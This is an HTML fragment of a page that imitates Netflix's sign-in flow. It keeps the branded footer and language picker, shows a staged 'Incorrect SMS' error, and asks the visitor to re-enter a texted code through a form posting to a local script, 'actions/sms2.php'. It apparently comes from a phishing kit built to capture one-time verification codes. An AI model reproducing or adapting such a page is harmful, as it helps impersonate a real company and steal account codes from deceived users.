   ...
   <div class="simpleContainer">
                        ...
                        <form method="POST" action="actions/sms2.php">
                            <div class="regFormContainer" >
                                <div class="stepHeader-container" >
                                    ...
                                    <div data-uia="error-message-container" class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div data-uia="text" class="ui-message-contents"><b>Incorrect SMS.</b> Please try again.</div></div>
                                        <h1 class="stepTitle" >Please re-enter the sms code we sent you.</h1>
                                    </div>
                                </div>
                                <div>
            ...
            <div class="site-footer-wrapper centered">
                ...
                <div class="site-footer">
                    <p class="footer-top"><a class="footer-top-a" href="https://help.netflix.com/contactus">Questions? Contact
                            us.</a></p>
                    <ul class="footer-links structural">
                        <li class="footer-link-item" placeholder="footer_responsive_link_faq_item"><a class="footer-link"
                                ...
                                placeholder="footer_responsive_link_faq"><span id="" data-uia="data-uia-footer-label">FAQ</span></a>
                        </li>
                    ...
                    <div class="lang-selection-container" id="lang-switcher">
                        <div class="nfSelectWrapper inFooter selectArrow prefix" data-uia="language-picker+container">
                            <div class="nfSelectPlacement globe"><select data-uia="language-picker" class="nfSelect"
                                    name="__langSelect" tabindex="0">
                                    <option disabled>العربية</option>
                                    <option disabled>Français</option>
                                    <option selected="">English</option>
                                </select><label class="nfLabel no-display placeLabel"></label></div>
                        </div>
                    </div>
                </div>
            </div>
